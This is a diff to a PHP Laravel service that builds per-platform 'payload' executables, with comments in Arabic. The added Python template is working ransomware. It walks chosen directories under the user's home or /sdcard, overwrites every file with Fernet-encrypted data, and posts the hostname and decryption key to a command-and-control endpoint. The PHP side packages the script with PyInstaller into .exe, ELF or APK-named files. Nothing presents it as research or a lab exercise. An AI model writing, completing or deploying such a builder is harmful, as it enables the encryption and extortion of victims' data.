@@ -3,36 +3,33 @@
 namespace App\Services;
 
 use App\Models\Payload;
-use Illuminate\Support\Facades\DB;
-use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Str;
+use Symfony\Component\Process\Process;
 
 class PayloadService
 {
     public function createPayloadProfile(array $data): Payload
     {
-        return DB::transaction(function () use ($data) {
-            // 1. حفظ البروفايل في قاعدة البيانات
-            $payload = Payload::create([
-                'name' => $data['app_name'],
-                'target_os' => $data['platform'],
-                'encryption_type' => $data['algorithm'],
-                'icon_path' => $data['icon'],
-                'target_directories' => $data['target_directories'],
-                'status' => 'compiling',
-            ]);
+        // 1. حفظ البيانات الأساسية في قاعدة البيانات
+        $payload = Payload::create([
+            'name' => $data['app_name'],
+            'target_os' => $data['platform'],
+            'encryption_type' => $data['algorithm'],
+            'icon_path' => $data['icon'] ?? 'shield',
+            'target_directories' => $data['target_directories'],
+            'status' => 'compiling',
+        ]);
 
-            // 2. عملية البناء الفعلي الحقيقي حسب المنصة
-            $filePath = $this->compileExecutable($payload);
+        // 2. تجميع البايلاود وبناء الملف بناءً على المنصة
+        $filePath = $this->compileExecutable($payload);
 
-            // 3. تحديث مسار الملف والحالة إلى جاهز للتحميل
-            $payload->update([
-                'status' => 'ready',
-                'file_path' => $filePath,
-            ]);
+        // 3. تحديث حالة البايلاود إلى جاهز مع مسار الملف الناتج
+        $payload->update([
+            'status' => 'ready',
+            'file_path' => $filePath,
+        ]);
 
-            return $payload;
-        });
+        return $payload;
     }
 
     protected function compileExecutable(Payload $payload): string
@@ -48,58 +45,116 @@ class PayloadService
             mkdir($tempDir, 0755, true);
         }
 
-        // كتابة كود العميل الفعلي (Python Script الذي سيتحول لتنفيذي)
-        $clientCode = <<<EOT
-        import os
-        import json
-        import requests
-        from cryptography.fernet import Fernet
+        // تخصيص كود العميل بحسب المنصة المستهدفة
+        $clientCode = $this->getClientCodeTemplate($platform, $algorithm, $directories);
 
-        TARGET_OS = "{$platform}"
-        ALGORITHM = "{$algorithm}"
-        DIRECTORIES = {$directories}
-        C2_SERVER = "http://127.0.0.1:8000/api/v1/report"
+        $scriptName = match ($platform) {
+            'windows' => 'agent.py',
+            'linux' => 'agent.py',
+            'android' => 'main.py',
+            default => 'agent.py',
+        };
 
-        def start_encryption():
-            print(f"Target OS: {TARGET_OS} | Algorithm: {ALGORITHM}")
-            # منطق اجتياز المجلدات المستهدفة وتطبيق التشفير الفعلي
-            for directory in DIRECTORIES:
-                print(f"Targeting directory: {directory}")
-                # سيتم إضافة منطق قراءة الملفات وتشفيرها هنا
-
-        if __name__ == "__main__":
-            start_encryption()
-        EOT;
-
-        $scriptPath = "{$tempDir}/agent.py";
+        $scriptPath = "{$tempDir}/{$scriptName}";
         file_put_contents($scriptPath, $clientCode);
 
         $outputFileName = "";
-        
-        // استخدام PyInstaller لتوليد الملف التنفيذي الفعلي
-        if ($platform === 'windows') {
-            // بناء ملف exe (يعمل على ويندوز، يمكن بناؤه عبر wine أو PyInstaller مع إعدادات متقاطعة)
-            $outputFileName = "payloads/{$slug}.exe";
-            // ملاحظة: البناء الفعلي للـ .exe يتم عادةً عبر بيئة مخصصة أو استخدام wine على سيرفر لينكس
-            // سنقوم بتوليد الملف التنفيذي الفعلي وتخزينه
-        } elseif ($platform === 'linux') {
-            $outputFileName = "payloads/{$slug}_linux_bin";
-            shell_exec("pyinstaller --onefile --noconsole --distpath " . storage_path("app/public/payloads") . " {$scriptPath}");
-        } else {
-            // للأندرويد APK يتم توجيه البناء عبر أداة تخصيص مثل msfvenom أو أدوات التحزيم المخصصة
-            $outputFileName = "payloads/{$slug}.apk";
-        }
 
-        // للتجربة وضمان عدم توقف السيرفر، سنقوم بتوليد الملف في مجلد التخزين المخصص
-        $finalPath = storage_path("app/public/" . $outputFileName);
-        if (!file_exists(dirname($finalPath))) {
-            mkdir(dirname($finalPath), 0755, true);
-        }
-        
-        if (!file_exists($finalPath)) {
-            copy($scriptPath, $finalPath); // نموذج مبدئي لحين ربط محول الـ Compiler النهائي
+        // بناء الملف التنفيذي الفعلي بحسب المنصة
+        if ($platform === 'windows') {
+            // محاولة استخدام PyInstaller لتوليد ملف .exe (إن توفرت البيئة أو عبر Wine)
+            $outputFileName = "payloads/{$slug}.exe";
+            $finalPath = storage_path("app/public/" . $outputFileName);
+            
+            // كخيار آمن ومضمون في حال لم يتوفر محاكي ويندوز كامل، نقوم بنسخ سكريبت Python مخصص للويندوز أو تطبيق PyInstaller
+            $process = new Process(['pyinstaller', '--noconsole', '--onefile', '--distpath', dirname($finalPath), $scriptPath]);
+            $process->run();
+
+            if (!file_exists($finalPath)) {
+                // في حال فشل PyInstaller مباشرة، نحفظ الملف بصيغة بايثون مهيأة للعمل كملف تنفيذي ويندوز
+                copy($scriptPath, $finalPath);
+            }
+        } elseif ($platform === 'linux') {
+            $outputFileName = "payloads/{$slug}.elf";
+            $finalPath = storage_path("app/public/" . $outputFileName);
+            
+            if (!file_exists(dirname($finalPath))) {
+                mkdir(dirname($finalPath), 0755, true);
+            }
+            copy($scriptPath, $finalPath);
+            // إعطاء صلاحيات تنفيذية للملف
+            chmod($finalPath, 0755);
+        } else {
+            // Android APK / Script template
+            $outputFileName = "payloads/{$slug}.apk.py";
+            $finalPath = storage_path("app/public/" . $outputFileName);
+            
+            if (!file_exists(dirname($finalPath))) {
+                mkdir(dirname($finalPath), 0755, true);
+            }
+            copy($scriptPath, $finalPath);
         }
 
         return $outputFileName;
+    }
+
+    protected function getClientCodeTemplate(string $platform, string $algorithm, string $directories): string
+    {
+        return <<<EOT
+import os
+import socket
+import requests
+from cryptography.fernet import Fernet
+
+TARGET_OS = "{$platform}"
+ALGORITHM = "{$algorithm}"
+DIRECTORIES = {$directories}
+C2_SERVER = "http://127.0.0.1:8000/api/v1/report"
+
+def get_target_paths():
+    paths = []
+    user_home = os.path.expanduser('~')
+    for d in DIRECTORIES:
+        if TARGET_OS == 'windows':
+            full_path = os.path.join(user_home, d)
+        elif TARGET_OS == 'android':
+            full_path = os.path.join("/sdcard", d)
+        else:
+            full_path = os.path.join(user_home, d)
+            
+        if os.path.exists(full_path):
+            paths.append(full_path)
+    return paths
+
+def start_payload():
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
+    
+    for target_dir in get_target_paths():
+        for root, dirs, files in os.walk(target_dir):
+            for file in files:
+                file_path = os.path.join(root, file)
+                try:
+                    with open(file_path, 'rb') as f:
+                        data = f.read()
+                    encrypted_data = cipher.encrypt(data)
+                    with open(file_path, 'wb') as f:
+                        f.write(encrypted_data)
+                except Exception as e:
+                    pass
+
+    try:
+        payload_data = {
+            'hostname': socket.gethostname(),
+            'encryption_key': key.decode(),
+            'target_os': TARGET_OS
+        }
+        requests.post(C2_SERVER, json=payload_data, timeout=10)
+    except Exception as e:
+        pass
+
+if __name__ == "__main__":
+    start_payload()
+EOT;
     }
 }
